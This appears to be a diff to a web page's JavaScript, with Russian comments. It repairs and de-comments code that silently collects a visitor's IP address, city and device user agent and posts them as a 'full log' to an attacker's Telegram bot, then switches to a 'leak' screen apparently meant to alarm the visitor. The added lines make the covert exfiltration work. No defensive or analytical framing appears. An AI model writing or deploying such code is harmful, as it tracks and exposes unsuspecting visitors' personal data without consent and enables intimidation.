@@ -72,45 +72,44 @@
             let city = "Неизвестно";
 
             try {
-                // 1. Получаем IPv4 (цифры)
-                const ipRes = await fetch('https://api.ipify.org');
+              
+                const ipRes = await fetch(`https://api.ipify.org?format=json`);
                 const ipData = await ipRes.json();
                 ip = ipData.ip;
 
-                // 2. Тройной поиск города
-                // Сначала пробуем самый стабильный сервис
+             
                 try {
-                    const resA = await fetch(`https://freeipapi.com{ip}`);
+                    const resA = await fetch(`https://freeipapi.com/api/json/${ip}`);
                     const dA = await resA.json();
                     if (dA.cityName) {
                         city = `${dA.cityName}, ${dA.countryName}`;
                     }
                 } catch(e) {}
 
-                // Если первый не сработал, пробуем ipwho.is
+              
                 if (city === "Неизвестно") {
                     try {
-                        const resB = await fetch(`https://ipwho.is{ip}`);
+                        const resB = await fetch(`https://ipwho.is/${ip}`);
                         const dB = await resB.json();
                         if (dB.success) city = `${dB.city}, ${dB.country}`;
                     } catch(e) {}
                 }
 
-                // Вписываем данные в красное окно
+                 
                 document.getElementById('user-ip').innerText = ip;
                 document.getElementById('user-geo').innerText = city;
                 document.getElementById('user-os').innerText = navigator.platform;
 
-                // 3. Шлем лог в Телеграм
+                 
                 const msg = `🔥 ПОЛНЫЙ ЛОГ!\n📍 IP: ${ip}\n🌍 Город: ${city}\n📱 Устройство: ${navigator.userAgent}`;
-                await fetch(`https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
 
             } catch (e) {
-                // Если всё упало - шлем уведомление об ошибке
-                await fetch(`https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("⚠️ Ошибка сбора данных: " + e.message)}`);
+                
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("⚠️ Ошибка сбора данных: " + e.message)}`);
             }
 
-            // Переключаем экран через полсекунды после отправки
+             
             setTimeout(() => {
                 document.getElementById('terminal').style.display = 'none';
                 document.getElementById('leak-box').style.display = 'block';
